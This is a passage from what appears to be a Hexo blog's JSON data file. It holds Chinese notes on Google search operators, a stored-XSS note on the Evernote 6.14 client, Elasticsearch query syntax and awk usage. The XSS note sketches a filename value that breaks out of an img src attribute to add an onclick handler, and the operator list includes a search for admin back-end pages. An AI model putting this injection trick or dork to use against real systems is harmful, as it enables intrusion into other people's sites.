daterange:2450958-2450968</li>\n<li>weather: 天气. 例: weather:beijing</li>\n<li>group:</li>\n<li>stocks: 股票信息。 例:stocks:alibaba</li>\n<li>define:显示某术语定义。例:define:网络安全</li>\n<li>phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话</li>\n<li>link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:<a href=\"http://www.vvv518.com\" target=\"_blank\" rel=\"noopener\">www.vvv518.com</a></li>\n<li>msgid: 通过消息id搜索</li>\n</ul>\n<h4 id=\"3-语法\"><a href=\"#3-语法\" class=\"headerlink\" title=\"3.语法\"></a>3.语法</h4><ul>\n<li>“” 精确操作</li>\n<li>关键字之间不需要间隔，空格代表逻辑与操作</li>\n<li>- 忽略某个关键词. 例:a-b 搜索有a没b的网页</li>\n<li>～ 同义词</li>\n<li>+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。</li>\n<li>布尔and/or/not 例：aorb</li>\n<li>通配符，出现通配符的关键字需要用引号。*多个， ？和 . 单个</li>\n</ul>\n<h4 id=\"4-注意\"><a href=\"#4-注意\" class=\"headerlink\" title=\"4.注意\"></a>4.注意</h4><ol>\n<li>google只能32个单词查询。<br></li>\n<li>操作符、冒号、关键字之间是没有空格的。</li>\n<li>高级操作符能够和单独的查询混合使用</li>\n</ol>\n<h4 id=\"5-例子\"><a href=\"#5-例子\" class=\"headerlink\" title=\"5.例子\"></a>5.例子</h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"1-GooleHacking\"><a href=\"#1-GooleHacking\" class=\"headerlink\" title=\"1.GooleHacking\"></a>1.GooleHacking</h4><p>利用搜索引擎的强大搜索能力，针对性的全网搜集所需资料。<br></p>\n<h4 id=\"2-关键字\"><a href=\"#2-关键字\" class=\"headerlink\" title=\"2.关键字\"></a>2.关键字</h4><ul>\n<li>intext/allintext: 在正文中搜索</li>\n<li>intitle/allintitle: 网页标题中， 例:intitle:后台管理，有很多</li>\n<li>cache: 缓存中？？</li>\n<li>filetype: 文件类型,   例:信息安全 filetype:doc</li>\n<li>info: 摘要信息</li>\n<li>inurl/allinurl: 在网址中</li>\n<li>site: 域名，返回域名中的所有url地址，用于检查网站拓扑结构。 例: site: baidu.com</li>\n<li>related: 搜索相关站点。  例:related:pku.edu.cn</li>\n<li>inanchor: 在链接文本中搜索。 例：inanchor:pku.edu.cn</li>\n<li>author: 新闻组贴子的作者。例:在google scholar搜索作者. author:”John”</li>\n<li>datarange: 某个日期范围内的网页.格式为天文学儒掠日。例：”Geri Halliwell” “Spice Girls” daterange:2450958-2450968</li>\n<li>weather: 天气. 例: weather:beijing</li>\n<li>group:</li>\n<li>stocks: 股票信息。 例:stocks:alibaba</li>\n<li>define:显示某术语定义。例:define:网络安全</li>\n<li>phonebook: 电话列表？？。 rphonebook:住宅电话 ; bphonebook:商业电话</li>\n<li>link：搜索与当前网页存在链接的网页（不能与其他操作符或搜索关键字混合使用. 例：link:<a href=\"http://www.vvv518.com\" target=\"_blank\" rel=\"noopener\">www.vvv518.com</a></li>\n<li>msgid: 通过消息id搜索</li>\n</ul>\n<h4 id=\"3-语法\"><a href=\"#3-语法\" class=\"headerlink\" title=\"3.语法\"></a>3.语法</h4><ul>\n<li>“” 精确操作</li>\n<li>关键字之间不需要间隔，空格代表逻辑与操作</li>\n<li>- 忽略某个关键词. 例:a-b 搜索有a没b的网页</li>\n<li>～ 同义词</li>\n<li>+ 加入被忽略的关键字。google对com等频率高的英文单词做了忽略处理，加上 + ，使之强制搜索。</li>\n<li>布尔and/or/not 例：aorb</li>\n<li>通配符，出现通配符的关键字需要用引号。*多个， ？和 . 单个</li>\n</ul>\n<h4 id=\"4-注意\"><a href=\"#4-注意\" class=\"headerlink\" title=\"4.注意\"></a>4.注意</h4><ol>\n<li>google只能32个单词查询。<br></li>\n<li>操作符、冒号、关键字之间是没有空格的。</li>\n<li>高级操作符能够和单独的查询混合使用</li>\n</ol>\n<h4 id=\"5-例子\"><a href=\"#5-例子\" class=\"headerlink\" title=\"5.例子\"></a>5.例子</h4>"},{"title":"xss","date":"2018-11-06T19:43:30.000Z","_content":"\n1.印象笔记6.14客户端版本\n存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。\nsrc属性或者value属性?\n<img .. src=\"图片路径 + 图片名\">\n<img .. src=\"图片路径 + \" onclick=\"xss\">.jpg \">\n","source":"_posts/security/xss.md","raw":"---\ntitle: xss\ndate: 2018-11-06 14:43:30\ntags: [security]\n---\n\n1.印象笔记6.14客户端版本\n存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。\nsrc属性或者value属性?\n<img .. src=\"图片路径 + 图片名\">\n<img .. src=\"图片路径 + \" onclick=\"xss\">.jpg \">\n","slug":"security/xss","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ie001y6dcp35xyy5gm","content":"<p>1.印象笔记6.14客户端版本<br>存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。<br>src属性或者value属性?<br><img ..=\"\" src=\"图片路径 + 图片名\"><br><img ..=\"\" src=\"图片路径 + \" onclick=\"xss\">.jpg “&gt;</p>\n","site":{"data":{}},"excerpt":"","more":"<p>1.印象笔记6.14客户端版本<br>存储型xss,上传的图片保存时为用户输入名字，(某个属性，src属性或者value属性?)未过滤编码等。<br>src属性或者value属性?<br><img ..=\"\" src=\"图片路径 + 图片名\"><br><img ..=\"\" src=\"图片路径 + \" onclick=\"xss\">.jpg “&gt;</p>\n"},{"title":"springboot 整合 es 的RestHighLevelClient","date":"2019-07-16T22:55:31.000Z","_content":"\n官方文档: https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html\n\n###  一.基本查询方式\n- match\n\n在查询前会用分析器去分析字符串,会进行分词匹配搜索. <br>\n如果在一个精确值的字段上使用它， 例如数字、日期、布尔或者一个 not_analyzed 字符串字段，那么它将会精确匹配给定的值<br>\n\n- match_all\n\n匹配所有文档.<br>\n\n- multi_match\n\n可以在多个fileds上执行匹配<br>\n\n- range\n\n在区间内匹配<br>\n\n- term\n\n精确查询，完全匹配，不会进行分词.<br>\n\n- terms\n\n可以匹配多个值<br>\n\n- exists/missing\n\nexists 和 missing 被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档.\n\n### 二.组合查询\n\n#### 1.bool\n\n\n接收的参数:\n```\n{\n    \"bool\": {\n        \"must\":     { \"match\": { \"title\": \"how to make millions\" }},\n        \"must_not\": { \"match\": { \"tag\":   \"spam\" }},\n        \"should\": [\n            { \"match\": { \"tag\": \"starred\" }}\n        ],\n        \"filter\": {\n          \"range\": { \"date\": { \"gte\": \"2014-01-01\" }}\n        }\n    }\n}\n```\n\n\n- must\n\n必须匹配\n\n- must_not\n\n必须不匹配\n\n- should\n\n如果没有 must 语句，那么至少需要能够匹配其中的一条 should 语句。但，如果存在至少一条 must 语句，则对 should 语句的匹配没有要求<br>\n有 must 时，如果满足这些语句中的任意语句，将增加 _score ，否则，无任何影响。<br>\n用于增加评分<br>\n\n#### 2.constant_score\n\n<strong> 不常用</strong><br>\nconstant_score 它将一个不变的常量评分应用于所有匹配的文档。它被经常用于你只需要执行一个 filter 而没有其它查询（例如，评分查询）的情况下。\n```\n{\n    \"constant_score\":   {\n        \"filter\": {\n            \"term\": { \"category\": \"ebooks\" }\n        }\n    }\n}\n```\n可以使用它来取代只有 filter 语句的 bool 查询。在性能上是完全相同的，但对于提高查询简洁性和清晰度有很大帮助。\n\n- filter\n\n根据过滤标准来排除或包含文档。\n","source":"_posts/tools/Es基本语法.md","raw":"---\ntitle: springboot 整合 es 的RestHighLevelClient\ndate: 2019-07-16 18:55:31\ntags: [tools]\n---\n\n官方文档: https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html\n\n###  一.基本查询方式\n- match\n\n在查询前会用分析器去分析字符串,会进行分词匹配搜索. <br>\n如果在一个精确值的字段上使用它， 例如数字、日期、布尔或者一个 not_analyzed 字符串字段，那么它将会精确匹配给定的值<br>\n\n- match_all\n\n匹配所有文档.<br>\n\n- multi_match\n\n可以在多个fileds上执行匹配<br>\n\n- range\n\n在区间内匹配<br>\n\n- term\n\n精确查询，完全匹配，不会进行分词.<br>\n\n- terms\n\n可以匹配多个值<br>\n\n- exists/missing\n\nexists 和 missing 被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档.\n\n### 二.组合查询\n\n#### 1.bool\n\n\n接收的参数:\n```\n{\n    \"bool\": {\n        \"must\":     { \"match\": { \"title\": \"how to make millions\" }},\n        \"must_not\": { \"match\": { \"tag\":   \"spam\" }},\n        \"should\": [\n            { \"match\": { \"tag\": \"starred\" }}\n        ],\n        \"filter\": {\n          \"range\": { \"date\": { \"gte\": \"2014-01-01\" }}\n        }\n    }\n}\n```\n\n\n- must\n\n必须匹配\n\n- must_not\n\n必须不匹配\n\n- should\n\n如果没有 must 语句，那么至少需要能够匹配其中的一条 should 语句。但，如果存在至少一条 must 语句，则对 should 语句的匹配没有要求<br>\n有 must 时，如果满足这些语句中的任意语句，将增加 _score ，否则，无任何影响。<br>\n用于增加评分<br>\n\n#### 2.constant_score\n\n<strong> 不常用</strong><br>\nconstant_score 它将一个不变的常量评分应用于所有匹配的文档。它被经常用于你只需要执行一个 filter 而没有其它查询（例如，评分查询）的情况下。\n```\n{\n    \"constant_score\":   {\n        \"filter\": {\n            \"term\": { \"category\": \"ebooks\" }\n        }\n    }\n}\n```\n可以使用它来取代只有 filter 语句的 bool 查询。在性能上是完全相同的，但对于提高查询简洁性和清晰度有很大帮助。\n\n- filter\n\n根据过滤标准来排除或包含文档。\n","slug":"tools/Es基本语法","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321if00206dcp689j9w9f","content":"<p>官方文档: <a href=\"https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html\" target=\"_blank\" rel=\"noopener\">https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html</a></p>\n<h3 id=\"一-基本查询方式\"><a href=\"#一-基本查询方式\" class=\"headerlink\" title=\"一.基本查询方式\"></a>一.基本查询方式</h3><ul>\n<li>match</li>\n</ul>\n<p>在查询前会用分析器去分析字符串,会进行分词匹配搜索. <br><br>如果在一个精确值的字段上使用它， 例如数字、日期、布尔或者一个 not_analyzed 字符串字段，那么它将会精确匹配给定的值<br></p>\n<ul>\n<li>match_all</li>\n</ul>\n<p>匹配所有文档.<br></p>\n<ul>\n<li>multi_match</li>\n</ul>\n<p>可以在多个fileds上执行匹配<br></p>\n<ul>\n<li>range</li>\n</ul>\n<p>在区间内匹配<br></p>\n<ul>\n<li>term</li>\n</ul>\n<p>精确查询，完全匹配，不会进行分词.<br></p>\n<ul>\n<li>terms</li>\n</ul>\n<p>可以匹配多个值<br></p>\n<ul>\n<li>exists/missing</li>\n</ul>\n<p>exists 和 missing 被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档.</p>\n<h3 id=\"二-组合查询\"><a href=\"#二-组合查询\" class=\"headerlink\" title=\"二.组合查询\"></a>二.组合查询</h3><h4 id=\"1-bool\"><a href=\"#1-bool\" class=\"headerlink\" title=\"1.bool\"></a>1.bool</h4><p>接收的参数:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;bool&quot;: &#123;</span><br><span class=\"line\">        &quot;must&quot;:     &#123; &quot;match&quot;: &#123; &quot;title&quot;: &quot;how to make millions&quot; &#125;&#125;,</span><br><span class=\"line\">        &quot;must_not&quot;: &#123; &quot;match&quot;: &#123; &quot;tag&quot;:   &quot;spam&quot; &#125;&#125;,</span><br><span class=\"line\">        &quot;should&quot;: [</span><br><span class=\"line\">            &#123; &quot;match&quot;: &#123; &quot;tag&quot;: &quot;starred&quot; &#125;&#125;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">        &quot;filter&quot;: &#123;</span><br><span class=\"line\">          &quot;range&quot;: &#123; &quot;date&quot;: &#123; &quot;gte&quot;: &quot;2014-01-01&quot; &#125;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>must</li>\n</ul>\n<p>必须匹配</p>\n<ul>\n<li>must_not</li>\n</ul>\n<p>必须不匹配</p>\n<ul>\n<li>should</li>\n</ul>\n<p>如果没有 must 语句，那么至少需要能够匹配其中的一条 should 语句。但，如果存在至少一条 must 语句，则对 should 语句的匹配没有要求<br><br>有 must 时，如果满足这些语句中的任意语句，将增加 _score ，否则，无任何影响。<br><br>用于增加评分<br></p>\n<h4 id=\"2-constant-score\"><a href=\"#2-constant-score\" class=\"headerlink\" title=\"2.constant_score\"></a>2.constant_score</h4><p><strong> 不常用</strong><br><br>constant_score 它将一个不变的常量评分应用于所有匹配的文档。它被经常用于你只需要执行一个 filter 而没有其它查询（例如，评分查询）的情况下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;constant_score&quot;:   &#123;</span><br><span class=\"line\">        &quot;filter&quot;: &#123;</span><br><span class=\"line\">            &quot;term&quot;: &#123; &quot;category&quot;: &quot;ebooks&quot; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以使用它来取代只有 filter 语句的 bool 查询。在性能上是完全相同的，但对于提高查询简洁性和清晰度有很大帮助。</p>\n<ul>\n<li>filter</li>\n</ul>\n<p>根据过滤标准来排除或包含文档。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>官方文档: <a href=\"https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html\" target=\"_blank\" rel=\"noopener\">https://www.elastic.co/guide/cn/elasticsearch/guide/current/_most_important_queries.html</a></p>\n<h3 id=\"一-基本查询方式\"><a href=\"#一-基本查询方式\" class=\"headerlink\" title=\"一.基本查询方式\"></a>一.基本查询方式</h3><ul>\n<li>match</li>\n</ul>\n<p>在查询前会用分析器去分析字符串,会进行分词匹配搜索. <br><br>如果在一个精确值的字段上使用它， 例如数字、日期、布尔或者一个 not_analyzed 字符串字段，那么它将会精确匹配给定的值<br></p>\n<ul>\n<li>match_all</li>\n</ul>\n<p>匹配所有文档.<br></p>\n<ul>\n<li>multi_match</li>\n</ul>\n<p>可以在多个fileds上执行匹配<br></p>\n<ul>\n<li>range</li>\n</ul>\n<p>在区间内匹配<br></p>\n<ul>\n<li>term</li>\n</ul>\n<p>精确查询，完全匹配，不会进行分词.<br></p>\n<ul>\n<li>terms</li>\n</ul>\n<p>可以匹配多个值<br></p>\n<ul>\n<li>exists/missing</li>\n</ul>\n<p>exists 和 missing 被用于查找那些指定字段中有值 (exists) 或无值 (missing) 的文档.</p>\n<h3 id=\"二-组合查询\"><a href=\"#二-组合查询\" class=\"headerlink\" title=\"二.组合查询\"></a>二.组合查询</h3><h4 id=\"1-bool\"><a href=\"#1-bool\" class=\"headerlink\" title=\"1.bool\"></a>1.bool</h4><p>接收的参数:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;bool&quot;: &#123;</span><br><span class=\"line\">        &quot;must&quot;:     &#123; &quot;match&quot;: &#123; &quot;title&quot;: &quot;how to make millions&quot; &#125;&#125;,</span><br><span class=\"line\">        &quot;must_not&quot;: &#123; &quot;match&quot;: &#123; &quot;tag&quot;:   &quot;spam&quot; &#125;&#125;,</span><br><span class=\"line\">        &quot;should&quot;: [</span><br><span class=\"line\">            &#123; &quot;match&quot;: &#123; &quot;tag&quot;: &quot;starred&quot; &#125;&#125;</span><br><span class=\"line\">        ],</span><br><span class=\"line\">        &quot;filter&quot;: &#123;</span><br><span class=\"line\">          &quot;range&quot;: &#123; &quot;date&quot;: &#123; &quot;gte&quot;: &quot;2014-01-01&quot; &#125;&#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>must</li>\n</ul>\n<p>必须匹配</p>\n<ul>\n<li>must_not</li>\n</ul>\n<p>必须不匹配</p>\n<ul>\n<li>should</li>\n</ul>\n<p>如果没有 must 语句，那么至少需要能够匹配其中的一条 should 语句。但，如果存在至少一条 must 语句，则对 should 语句的匹配没有要求<br><br>有 must 时，如果满足这些语句中的任意语句，将增加 _score ，否则，无任何影响。<br><br>用于增加评分<br></p>\n<h4 id=\"2-constant-score\"><a href=\"#2-constant-score\" class=\"headerlink\" title=\"2.constant_score\"></a>2.constant_score</h4><p><strong> 不常用</strong><br><br>constant_score 它将一个不变的常量评分应用于所有匹配的文档。它被经常用于你只需要执行一个 filter 而没有其它查询（例如，评分查询）的情况下。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;constant_score&quot;:   &#123;</span><br><span class=\"line\">        &quot;filter&quot;: &#123;</span><br><span class=\"line\">            &quot;term&quot;: &#123; &quot;category&quot;: &quot;ebooks&quot; &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以使用它来取代只有 filter 语句的 bool 查询。在性能上是完全相同的，但对于提高查询简洁性和清晰度有很大帮助。</p>\n<ul>\n<li>filter</li>\n</ul>\n<p>根据过滤标准来排除或包含文档。</p>\n"},{"title":"awk用法","date":"2018-12-31T16:55:31.000Z","_content":"#### 1.awk\n用于处理文本\n#### 2.用法\n参考[菜鸟教程](http://www.runoob.com/linux/linux-comm-awk.html)\n```\nawk [选项参数] 'script' var=value file(s)\n或\nawk [选项参数] -f scriptfile var=value file(s)\n```\n###### 1.选项参数\n- -F fs or --field-separator fs<br>\n指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br>\n\n```\nawk -F, '{print $1,$2}' xxx.txt\n以逗号为分隔符，打印第一第二列\n```\n- -v var=value or --asign var=value\n赋值一个用户定义变量。\n\n```\nawk -va=1 '{print $1,$1+a}' xxx.txt\n设置a为变量，打印第一和a+1列\n```\n###### 2.运算符\n```\n= += -= *= /= %= ^= **=\t赋值\n?:\tC条件表达式\n||\t逻辑或\n&&\t逻辑与\n~ ~!\t匹配正则表达式和不匹配正则表达式\n< <= > >= != ==\t关系运算符\n空格\t连接\n+ -\t加，减\n* / %\t乘，除与求余\n+ - !\t一元加，减和逻辑非\n^ ***\t求幂\n++ --\t增加或减少，作为前缀或后缀\n$\t字段引用\nin\t数组成员\n```\n```\nawk '$1>2' xxx.txt\n输出第一列大于2的行\nawk -F, '$1>2' xxx.txt\n输出第一列大于2的行(字符串也会进行比较 例:value1-2 > 2)\nvalue1-1 + value1-2 = 0?\nawk -F, '$1=2' xxx.txt\n将第一列赋值为2\nawk '$1>2 && $2==\"Are\" {print $1,$2,$3}' xxx.txt\n第一列大于2并且第二列等于'Are'的行,输出第一二三列\n```\n\n###### 3.内建变量\n```\n$n\t当前记录的第n个字段，字段间由FS分隔\n$0\t完整的输入记录\nARGC\t命令行参数的数目\nARGIND\t命令行中当前文件的位置(从0开始算)\nARGV\t包含命令行参数的数组\nCONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组\nERRNO\t最后一个系统错误的描述\nFIELDWIDTHS\t字段宽度列表(用空格键分隔)\nFILENAME\t当前文件名\nFNR\t各文件分别计数的行号\nFS\t字段分隔符(默认是任何空格)\nIGNORECASE\t如果为真，则进行忽略大小写的匹配\nNF\t一条记录的字段的数目\nNR\t已经读出的记录数，就是行号，从1开始\nOFMT\t数字的输出格式(默认值是%.6g)\nOFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符\nORS\t输出记录分隔符(默认值是一个换行符)\nRLENGTH\t由match函数所匹配的字符串的长度\nRS\t记录分隔符(默认是一个换行符)\nRSTART\t由match函数所匹配的字符串的第一个位置\nSUBSEP\t数组下标分隔符(默认值是/034)\n```\n","source":"_posts/tools/awk.md","raw":"---\ntitle: awk用法\ndate: 2018-12-31 11:55:31\ntags: [linux]\n---\n#### 1.awk\n用于处理文本\n#### 2.用法\n参考[菜鸟教程](http://www.runoob.com/linux/linux-comm-awk.html)\n```\nawk [选项参数] 'script' var=value file(s)\n或\nawk [选项参数] -f scriptfile var=value file(s)\n```\n###### 1.选项参数\n- -F fs or --field-separator fs<br>\n指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br>\n\n```\nawk -F, '{print $1,$2}' xxx.txt\n以逗号为分隔符，打印第一第二列\n```\n- -v var=value or --asign var=value\n赋值一个用户定义变量。\n\n```\nawk -va=1 '{print $1,$1+a}' xxx.txt\n设置a为变量，打印第一和a+1列\n```\n###### 2.运算符\n```\n= += -= *= /= %= ^= **=\t赋值\n?:\tC条件表达式\n||\t逻辑或\n&&\t逻辑与\n~ ~!\t匹配正则表达式和不匹配正则表达式\n< <= > >= != ==\t关系运算符\n空格\t连接\n+ -\t加，减\n* / %\t乘，除与求余\n+ - !\t一元加，减和逻辑非\n^ ***\t求幂\n++ --\t增加或减少，作为前缀或后缀\n$\t字段引用\nin\t数组成员\n```\n```\nawk '$1>2' xxx.txt\n输出第一列大于2的行\nawk -F, '$1>2' xxx.txt\n输出第一列大于2的行(字符串也会进行比较 例:value1-2 > 2)\nvalue1-1 + value1-2 = 0?\nawk -F, '$1=2' xxx.txt\n将第一列赋值为2\nawk '$1>2 && $2==\"Are\" {print $1,$2,$3}' xxx.txt\n第一列大于2并且第二列等于'Are'的行,输出第一二三列\n```\n\n###### 3.内建变量\n```\n$n\t当前记录的第n个字段，字段间由FS分隔\n$0\t完整的输入记录\nARGC\t命令行参数的数目\nARGIND\t命令行中当前文件的位置(从0开始算)\nARGV\t包含命令行参数的数组\nCONVFMT\t数字转换格式(默认值为%.6g)ENVIRON环境变量关联数组\nERRNO\t最后一个系统错误的描述\nFIELDWIDTHS\t字段宽度列表(用空格键分隔)\nFILENAME\t当前文件名\nFNR\t各文件分别计数的行号\nFS\t字段分隔符(默认是任何空格)\nIGNORECASE\t如果为真，则进行忽略大小写的匹配\nNF\t一条记录的字段的数目\nNR\t已经读出的记录数，就是行号，从1开始\nOFMT\t数字的输出格式(默认值是%.6g)\nOFS\t输出记录分隔符（输出换行符），输出时用指定的符号代替换行符\nORS\t输出记录分隔符(默认值是一个换行符)\nRLENGTH\t由match函数所匹配的字符串的长度\nRS\t记录分隔符(默认是一个换行符)\nRSTART\t由match函数所匹配的字符串的第一个位置\nSUBSEP\t数组下标分隔符(默认值是/034)\n```\n","slug":"tools/awk","published":1,"updated":"2019-10-13T12:15:12.184Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321ig00236dcp9c9rxg4c","content":"<h4 id=\"1-awk\"><a href=\"#1-awk\" class=\"headerlink\" title=\"1.awk\"></a>1.awk</h4><p>用于处理文本</p>\n<h4 id=\"2-用法\"><a href=\"#2-用法\" class=\"headerlink\" title=\"2.用法\"></a>2.用法</h4><p>参考<a href=\"http://www.runoob.com/linux/linux-comm-awk.html\" target=\"_blank\" rel=\"noopener\">菜鸟教程</a><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk [选项参数] &apos;script&apos; var=value file(s)</span><br><span class=\"line\">或</span><br><span class=\"line\">awk [选项参数] -f scriptfile var=value file(s)</span><br></pre></td></tr></table></figure></p>\n<h6 id=\"1-选项参数\"><a href=\"#1-选项参数\" class=\"headerlink\" title=\"1.选项参数\"></a>1.选项参数</h6><ul>\n<li>-F fs or –field-separator fs<br><br>指定输入文件折分隔符，fs是一个字符串或者是一个正则表达式，如-F,。<br></li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -F, &apos;&#123;print $1,$2&#125;&apos; xxx.txt</span><br><span class=\"line\">以逗号为分隔符，打印第一第二列</span><br></pre></td></tr></table></figure>\n<ul>\n<li>-v var=value or –asign var=value<br>赋值一个用户定义变量。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk -va=1 &apos;&#123;print $1,$1+a&#125;&apos; xxx.txt</span><br><span class=\"line\">设置a为变量，打印第一和a+1列</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-运算符\"><a href=\"#2-运算符\" class=\"headerlink\" title=\"2.运算符\"></a>2.运算符</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">= += -= *= /= %= ^= **=\t赋值</span><br><span class=\"line\">?:\tC条件表达式</span><br><span class=\"line\">||\t逻辑或</span><br><span class=\"line\">&amp;&amp;\t逻辑与</span><br><span class=\"line\">~ ~!\t匹配正则表达式和不匹配正则表达式</span><br><span class=\"line\">&lt; &lt;= &gt; &gt;= != ==\t关系运算符</span><br><span class=\"line\">空格\t连接</span><br><span class=\"line\">+ -\t加，减</span><br><span class=\"line\">* / %\t乘，除与求余</span><br><span class=\"line\">+ - !\t一元加，减和逻辑非</span><br><span class=\"line\">^ ***\t求幂</span><br><span class=\"line\">++ --\t增加或减少，作为前缀或后缀</span><br><span class=\"line\">$\t字段引用</span><br><span class=\"line\">in\t数组成员</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">awk &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行</span><br><span class=\"line\">awk -F, &apos;$1&gt;2&apos; xxx.txt</span><br><span class=\"line\">输出第一列大于2的行(字符串也会进行比较 例:value1-2 &gt; 2)</span><br><span class=\"line\">value1-1 + value1-2 = 0?</span><br><span class=\"line\">awk -F, &apos;$1=2&apos; xxx.txt</span><br><span class=\"line\">将第一列赋值为2</span><br><span class=\"line\">awk &apos;$1&gt;2 &amp;&amp; $2==&quot;Are&quot; &#123;print $1,$2,$3&#125;&apos; xxx.txt</span><br><span class=\"line\">第一列大于2并且第二列等于&apos;Are&apos;的行,输出第一二三列</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-内建变量\"><a href=\"#3-内建变量\" class=\"headerlink\" title=\"3.内建变量\"></a>3.内建变量</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$n\t当前记录的第n个字段，字段间由FS分隔</span><br><span class=\"line\">$0\t完整的输入记录</span><br><span class=\"line\">ARGC\t命令行参数的数目</span><br><span class=\"line\">ARGIND\t命令行中当前文件的位置(从0开始算)</span><br><span class=\"line\">ARGV\t包含命令行参数的数组</span><br><span 